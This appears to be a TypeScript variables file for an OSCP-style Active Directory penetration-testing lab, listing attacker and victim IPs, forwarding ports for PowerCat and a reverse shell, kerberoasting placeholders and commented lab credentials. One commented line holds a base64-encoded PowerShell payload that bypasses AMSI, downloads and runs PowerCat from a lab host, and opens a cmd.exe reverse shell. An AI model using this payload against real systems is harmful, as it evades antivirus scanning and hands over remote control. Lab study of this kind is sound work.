// lib/lab-variables.tsx
export const LAB = {
  ATTACKER_IP:"192.162.118.10",//Vixx
  ATTACKER_PORT:"22",

// ---------------------------- AD Domain Name  ----------------------------
// export const AD_DOMAIN_NAME = "OSCP.EXAM" //updated
  AD_DOMAIN_NAME:"CAR.TOON", //mine
  BOX_DOMAIN_NAME:"futurevera.thm", //mine

// ---------------------------- Client01  aka MS01  ----------------------------

// // Client01 (aka MS01) Browser Viewing
// // - Internal (172.16.242.173)
// export const MS01_username = "r.andrews";  // updated
// export const MS01_password = "BusyOfficeWorker890"; //updated
  MS01_username:"his_username", // updated
  MS01_password:"his_password",//updated

// export const MS01_IP_EXT = "192.168.123.206";  //updated
// export const MS01_IP_INT = "172.16.123.206"; // updated
  MS01_IP_EXT:"192.168.118.173",//Vixx
  MS01_IP_INT:"172.16.242.173", //Vixx

  MS01_FORWARD_PORT_1:"80",  // To download <u>PowerCat</u>
  MS01_FORWARD_PORT_2:"4444",// To open <u>reverse shell</u>


// ---------------------------- WEB01  aka MS02  ----------------------------
// // WEB01 (aka MS02) Terminal
// // - Internal (172.16.242.176)
//updated
// export const MS02_IP_INT = "172.16.123.202"; //updated
  MS02_IP_INT:"172.16.242.176",//Vixx
  MS02_PORT_FORWARD:"4443",


// ---------------------------- DC01  aka DC01  ----------------------------
//updated
// export const DC01_IP = "172.16.123.200"; //updated
  DC01_IP:"172.16.242.162",//Vixx
  DC01_PORT_FORWARD:"4442",


// ---------------------------- AD Attacker  ----------------------------

  get AD_ATTACKER_IP() {
    return this.ATTACKER_IP;
  },
  AD_ATTACKER_LISTEN_PORT_1:"80", // To facilitate pulling of <u>PowerCat</u>
  AD_ATTACKER_LISTEN_PORT_2:"443",// To facilitate incoming <u>reverse shell</u> 


// // for kerberoasted service 
  RUNNING_SPN:"svc-auth",
  RUNNING_SPN_HASH:"hashhashashashverylong",
  RUNNING_SPN_PASSWORD:"running_spn_pas$word",


// // ENCODED_TEXT for SCSHELL
// // // // export const ENCODED_TEXT = "please_update_encoded_text_for_scshell"
// // // // export const ENCODED_TEXT = "WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACIAKwAkACgAIgA0ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA1ADUAIAA3ADQAIAA2ADkAIAA2AEMAIAA3ADMAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAArACQAXwB9ADsAJAByAGUAcwB1AGwAdAApACkALgBHAGUAdABGAGkAZQBsAGQAKAAkACgAIgA2ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA0ADkAIAA2AEUAIAA2ADkAIAA3ADQAIAA0ADYAIAA2ADEAIAA2ADkAIAA2AEMAIAA2ADUAIAA2ADQAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0ADIAPQAkAHIAZQBzAHUAbAB0ADIAKwAkAF8AfQA7ACQAcgBlAHMAdQBsAHQAMgApACwAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAIABpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgA0ADIALgAxADcAMwAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA3ADIALgAxADYALgAyADQAMgAuADEANwAzACAALQBwACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA"
  ENCODED_TEXT:"please_update_encoded_text_for_scshell",


// ---------------------------- VICTIM  ----------------------------
// For all sites VICTIM TAGGING  192.168.123.110
// export const VICTIM1_IP = MS01_IP_EXT;
// export const VICTIM1_IP = "192.168.123.110";

  get VICTIM1_NAME() {
    return this.MS01_username;
  },

  get VICTIM1_PASSWORD() {
    return this.MS01_password;
  },

  get VICTIM1_IP() {
    return this.MS01_IP_EXT;
  },

  get VICTIM1_PORT() {
    return this.MS01_FORWARD_PORT_2;
  },

};

// AD Setup

// MS01_IP_EXT = "192.168.118.173";
// MS01_IP_INT = "172.16.242.173";
// MS01_FORWARD_PORT_2 = "4444";

// // // for kerberoasted service 
// RUNNING_SPN = "svc-auth";

// // // ENCODED_TEXT for SCSHELL
// ENCODED_TEXT = "encoded_text_for_scshell"

// MS02_IP_INT = "172.16.242.176";
// MS02_PORT_FORWARD = "4443";

// DC01_IP = "172.16.242.162";
// DC01_PORT_FORWARD = "4442";

// ----------------------------  Attacker  ----------------------------
// ATTACKER_IP = "192.168.49.123"; //updated   